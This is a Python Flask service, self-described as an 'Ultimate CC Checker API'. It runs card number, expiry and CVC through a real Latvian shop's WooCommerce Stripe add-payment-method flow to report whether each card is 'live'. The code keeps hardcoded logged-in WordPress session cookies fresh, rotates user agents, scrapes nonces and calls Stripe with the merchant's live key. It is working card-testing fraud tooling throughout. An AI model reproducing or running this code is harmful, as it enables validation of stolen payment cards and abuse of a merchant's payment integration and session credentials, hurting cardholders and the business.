from flask import Flask, request, jsonify
import requests
import re
import os
import time
import random
import threading
import json
from datetime import datetime, timedelta
from urllib.parse import urlparse

app = Flask(__name__)

# 🔥 ULTIMATE COOKIE MANAGER
class UltimateCookieManager:
    def __init__(self):
        self.cookies = {}
        self.last_refresh = None
        self.is_refreshing = False
        self.refresh_interval = timedelta(minutes=15)  # Refresh every 15 minutes
        self.failed_attempts = 0
        self.max_failed_attempts = 3
        
        # User agents rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        ]
        
        # Initialize with best available method
        self.initialize_cookies()
        
        # Start background maintenance
        self.start_background_maintenance()
    
    def initialize_cookies(self):
        """Initialize cookies using the best available method"""
        print("🚀 Initializing cookie manager...")
        
        methods = [
            self.get_cookies_from_env,      # First try environment variables
            self.auto_refresh_cookies,      # Then try auto-refresh
            self.get_fallback_cookies       # Finally use fallback
        ]
        
        for method in methods:
            try:
                cookies = method()
                if cookies and self.validate_cookies(cookies):
                    self.cookies = cookies
                    self.last_refresh = datetime.now()
                    print(f"✅ Cookies initialized successfully")
                    return
            except Exception as e:
                print(f"❌ {method.__name__} failed: {e}")
                continue
        
        print("🚨 All cookie initialization methods failed")
    
    def get_cookies_from_env(self):
        """Get cookies from environment variables (Highest priority)"""
        wp_sec = os.environ.get('WP_SEC_COOKIE')
        wp_logged_in = os.environ.get('WP_LOGGED_IN_COOKIE')
        
        if wp_sec and wp_logged_in:
            print("🔑 Using cookies from environment variables")
            return {
                'wordpress_sec_417153a0f5c2f87ed25ef38d98bb3798': wp_sec,
                'wordpress_logged_in_417153a0f5c2f87ed25ef38d98bb3798': wp_logged_in,
                'wp-wpml_current_language': os.environ.get('WP_LANGUAGE_COOKIE', 'en'),
                '__stripe_mid': os.environ.get('STRIPE_MID_COOKIE', '588bccab-9133-4397-b3e2-f2785fdd613ca53fc1'),
                'woodmart_cookies_1': 'accepted',
                '_ga': 'GA1.1.1745993156.1761639993'
            }
        return None
    
    def auto_refresh_cookies(self):
        """Automatically refresh cookies by visiting the site"""
        print("🔄 Attempting auto-refresh...")
        
        session = requests.Session()
        
        # Set realistic headers
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # Step 1: Get main page
        main_response = session.get('https://e-led.lv/', headers=headers, timeout=10)
        time.sleep(1)
        
        # Step 2: Get account page
        account_response = session.get('https://e-led.lv/my-account/', headers=headers, timeout=10)
        time.sleep(1)
        
        # Step 3: Get payment page
        payment_response = session.get(
            'https://e-led.lv/my-account/add-payment-method/', 
            headers=headers, 
            timeout=10
        )
        
        # Extract cookies from session
        cookies_dict = {}
        for cookie in session.cookies:
            cookies_dict[cookie.name] = cookie.value
        
        print(f"🔄 Auto-refresh obtained {len(cookies_dict)} cookies")
        return cookies_dict
    
    def get_fallback_cookies(self):
        """Fallback cookies when all else fails"""
        print("⚠️ Using fallback cookies - consider updating environment variables")
        return {
            'wordpress_sec_417153a0f5c2f87ed25ef38d98bb3798': 'usljfjae2q%7C1762849683%7CQMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo%7Cfcc7f214dd3ce843e5685de367f552785729f3c31f8f81dfd09734e768a60625',
            'wordpress_logged_in_417153a0f5c2f87ed25ef38d98bb3798': 'usljfjae2q%7C1762849683%7CQMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo%7Cc6e9da7a0844dce9aa65df1edba937f150e7838393e5dd6d652310ab93dc7316',
            'wp-wpml_current_language': 'en',
            '__stripe_mid': '588bccab-9133-4397-b3e2-f2785fdd613ca53fc1',
            'woodmart_cookies_1': 'accepted',
            '_ga': 'GA1.1.1745993156.1761639993'
        }
    
    def validate_cookies(self, cookies):
        """Validate if cookies can extract nonce"""
        if not cookies:
            return False
        
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            }
            
            response = requests.get(
                'https://e-led.lv/my-account/add-payment-method/',
                headers=headers,
                cookies=cookies,
                timeout=10
            )
            
            if response.status_code != 200:
                return False
            
            # Check for nonce patterns
            nonce_patterns = [
                r'"stripe_nonce":"([a-f0-9]+)"',
                r'var wc_stripe_params = {[^}]*"nonce":"([a-f0-9]+)"',
                r'name="stripe_nonce" value="([a-f0-9]+)"'
            ]
            
            for pattern in nonce_patterns:
                if re.search(pattern, response.text):
                    return True
            
            return False
            
        except Exception as e:
            print(f"❌ Cookie validation error: {e}")
            return False
    
    def refresh_cookies(self):
        """Refresh cookies with smart retry logic"""
        if self.is_refreshing:
            return self.cookies
            
        self.is_refreshing = True
        
        try:
            # Try environment variables first (manual update)
            env_cookies = self.get_cookies_from_env()
            if env_cookies and self.validate_cookies(env_cookies):
                self.cookies = env_cookies
                self.last_refresh = datetime.now()
                self.failed_attempts = 0
                print("✅ Cookies refreshed from environment variables")
                return self.cookies
            
            # Try auto-refresh
            auto_cookies = self.auto_refresh_cookies()
            if auto_cookies and self.validate_cookies(auto_cookies):
                self.cookies = auto_cookies
                self.last_refresh = datetime.now()
                self.failed_attempts = 0
                print("✅ Cookies auto-refreshed successfully")
                return self.cookies
            
            # Increment failed attempts
            self.failed_attempts += 1
            print(f"⚠️ Cookie refresh failed ({self.failed_attempts}/{self.max_failed_attempts})")
            
            # If too many failures, use fallback
            if self.failed_attempts >= self.max_failed_attempts:
                print("🚨 Max failed attempts reached, using fallback cookies")
                self.cookies = self.get_fallback_cookies()
                self.last_refresh = datetime.now()
                
        except Exception as e:
            print(f"❌ Cookie refresh error: {e}")
        finally:
            self.is_refreshing = False
            
        return self.cookies
    
    def get_cookies(self):
        """Get current cookies with automatic refresh if needed"""
        # Force refresh if no cookies
        if not self.cookies:
            return self.refresh_cookies()
        
        # Refresh if interval exceeded
        if not self.last_refresh or (datetime.now() - self.last_refresh > self.refresh_interval):
            print("🔄 Cookie refresh interval reached")
            return self.refresh_cookies()
        
        # Validate current cookies
        if not self.validate_cookies(self.cookies):
            print("🔄 Cookies invalid, refreshing...")
            return self.refresh_cookies()
            
        return self.cookies
    
    def start_background_maintenance(self):
        """Background thread for maintenance"""
        def maintenance_worker():
            while True:
                try:
                    time.sleep(300)  # Check every 5 minutes
                    
                    # Refresh if approaching failure limit
                    if self.failed_attempts >= self.max_failed_attempts - 1:
                        print("🔄 Proactive cookie refresh (near failure limit)")
                        self.refresh_cookies()
                        
                except Exception as e:
                    print(f"Maintenance error: {e}")
        
        thread = threading.Thread(target=maintenance_worker, daemon=True)
        thread.start()
        print("✅ Background maintenance started")

# Initialize the ultimate cookie manager
cookie_manager = UltimateCookieManager()

# 🎯 ENHANCED NONCE EXTRACTOR
def extract_nonce_robust():
    """Robust nonce extraction with multiple fallbacks"""
    cookies = cookie_manager.get_cookies()
    
    headers = {
        'User-Agent': random.choice(cookie_manager.user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    
    try:
        response = requests.get(
            'https://e-led.lv/my-account/add-payment-method/',
            headers=headers,
            cookies=cookies,
            timeout=10
        )
        
        if response.status_code != 200:
            raise Exception(f"HTTP {response.status_code}")
        
        # Multiple extraction patterns
        patterns = [
            r'"stripe_nonce":"([a-f0-9]+)"',
            r'var wc_stripe_params = {[^}]*"nonce":"([a-f0-9]+)"',
            r'name="stripe_nonce" value="([a-f0-9]+)"',
            r'data-stripe-nonce="([a-f0-9]+)"',
            r"'nonce':'([a-f0-9]+)'"
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
        
        raise Exception("No nonce pattern matched")
        
    except Exception as e:
        print(f"❌ Nonce extraction failed: {e}")
        return None

# 🔧 CORE CC CHECKING FUNCTIONS (SAME AS BEFORE)
def luhn_check(card_number):
    card_number = str(card_number).replace(' ', '').replace('-', '')
    if not card_number.isdigit() or len(card_number) < 13:
        return False
        
    total = 0
    reverse_digits = card_number[::-1]
    
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
        
    return total % 10 == 0

def get_bin_info(card_number):
    try:
        bin_num = card_number[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "scheme": data.get("scheme", "Unknown"),
                "type": data.get("type", "Unknown"), 
                "brand": data.get("brand", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown")
            }
    except:
        pass
    return {"scheme": "Unknown", "type": "Unknown", "brand": "Unknown", "bank": "Unknown", "country": "Unknown"}

def create_stripe_payment_method(card_data):
    card_number, exp_month, exp_year, cvc = card_data
    
    stripe_data = f"type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F2ee772a1e3%3B+stripe-js-v3%2F2ee772a1e3%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fe-led.lv&time_on_page=150874&client_attribution_metadata[client_session_id]=3afab764-fb85-4fc8-a752-00b0d33415e7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=3ec638d7-fa58-4943-88ba-3df3e2cadd96&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=5f4b7095-9d5d-4032-bc0c-511afd16336d4ec3ab&muid=588bccab-9133-4397-b3e2-f2785fdd613ca53fc1&sid=df4979dd-7001-409e-881b-4bc937e597948a822d&key=pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20"
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': random.choice(cookie_manager.user_agents),
    }
    
    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=stripe_data,
            cookies=cookie_manager.get_cookies(),
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            return {'success': True, 'pm_id': data.get('id')}
        else:
            return {'success': False, 'error': f'Stripe Error: {response.status_code}'}
            
    except Exception as e:
        return {'success': False, 'error': f'Stripe Exception: {str(e)}'}

def confirm_ajax(pm_id, nonce):
    ajax_data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce
    }
    
    headers = {
        'authority': 'e-led.lv',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://e-led.lv',
        'referer': 'https://e-led.lv/my-account/add-payment-method/',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': random.choice(cookie_manager.user_agents),
    }
    
    try:
        response = requests.post(
            'https://e-led.lv/wp-admin/admin-ajax.php',
            headers=headers,
            data=ajax_data,
            cookies=cookie_manager.get_cookies(),
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            return {
                'success': True,
                'result': data.get('result'),
                'messages': data.get('messages')
            }
        else:
            return {'success': False, 'error': f'AJAX HTTP Error: {response.status_code}'}
            
    except Exception as e:
        return {'success': False, 'error': f'AJAX Exception: {str(e)}'}

# 🌐 API ENDPOINTS
@app.route('/cc=<path:cc_data>')
def check_cc_simple(cc_data):
    """Simple CC checking endpoint"""
    try:
        parts = cc_data.split('|')
        if len(parts) != 4:
            return jsonify({"status": "error", "message": "Format: /cc=number|mm|yy|cvc"})
        
        card_number, exp_month, exp_year, cvc = parts
        card_clean = str(card_number).replace(' ', '').replace('-', '')
        
        # Luhn Check
        if not luhn_check(card_clean):
            return jsonify({
                "status": "invalid",
                "message": "Luhn check failed",
                "card": card_clean[-4:],
                "bin_info": get_bin_info(card_clean)
            })
        
        # Extract Nonce
        nonce = extract_nonce_robust()
        if not nonce:
            return jsonify({
                "status": "error", 
                "message": "Cannot extract security nonce - cookies may need refresh"
            })
        
        # Create Stripe Payment Method
        card_data = [card_clean, exp_month, exp_year, cvc]
        stripe_result = create_stripe_payment_method(card_data)
        
        if not stripe_result['success']:
            return jsonify({
                "status": "dead",
                "message": stripe_result.get('error', 'Payment method creation failed'),
                "card": card_clean[-4:],
                "bin_info": get_bin_info(card_clean)
            })
        
        # Confirm via AJAX
        ajax_result = confirm_ajax(stripe_result['pm_id'], nonce)
        
        if ajax_result['success']:
            if ajax_result.get('result') == 'success':
                return jsonify({
                    "status": "live",
                    "message": "Card is LIVE and valid",
                    "card": card_clean[-4:],
                    "bin_info": get_bin_info(card_clean)
                })
            else:
                return jsonify({
                    "status": "dead", 
                    "message": ajax_result.get('messages', 'Card declined'),
                    "card": card_clean[-4:],
                    "bin_info": get_bin_info(card_clean)
                })
        else:
            return jsonify({
                "status": "error",
                "message": ajax_result.get('error', 'Confirmation failed'),
                "card": card_clean[-4:]
            })
            
    except Exception as e:
        return jsonify({"status": "error", "message": f"Processing error: {str(e)}"})

# 🔧 MANAGEMENT ENDPOINTS
@app.route('/refresh-cookies')
def refresh_cookies_endpoint():
    """Manual cookie refresh"""
    try:
        cookies = cookie_manager.refresh_cookies()
        is_valid = cookie_manager.validate_cookies(cookies)
        
        return jsonify({
            'status': 'success' if is_valid else 'warning',
            'message': 'Cookies refreshed' if is_valid else 'Cookies refreshed but validation failed',
            'cookies_valid': is_valid,
            'cookies_count': len(cookies),
            'failed_attempts': cookie_manager.failed_attempts,
            'wordpress_cookies': any('wordpress' in key for key in cookies.keys())
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/cookie-status')
def cookie_status():
    """Check cookie status"""
    cookies = cookie_manager.get_cookies()
    is_valid = cookie_manager.validate_cookies(cookies)
    
    return jsonify({
        'cookies_valid': is_valid,
        'cookies_count': len(cookies),
        'failed_attempts': cookie_manager.failed_attempts,
        'last_refresh': cookie_manager.last_refresh.isoformat() if cookie_manager.last_refresh else None,
        'using_environment_cookies': 'WP_SEC_COOKIE' in os.environ and os.environ.get('WP_SEC_COOKIE') in str(cookies),
        'cookie_keys': list(cookies.keys())[:5]  # First 5 keys only
    })

@app.route('/')
def home():
    return jsonify({
        'message': 'Ultimate CC Checker API - Auto Cookie Management',
        'endpoints': {
            'check_cc': '/cc=number|mm|yy|cvc',
            'cookie_status': '/cookie-status',
            'refresh_cookies': '/refresh-cookies',
            'status': '/status'
        },
        'features': [
            'Auto cookie refresh every 15 minutes',
            'Environment variable fallback',
            'Smart retry logic',
            'Background maintenance'
        ]
    })

@app.route('/status')
def status():
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'version': 'ultimate-1.0'
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    print("🚀 Ultimate CC Checker API Starting...")
    print("🔧 Features: Auto-cookie refresh + Environment fallback")
    print("🌐 Ready to handle cookie expiration automatically!")
    app.run(host='0.0.0.0', port=port, debug=False)
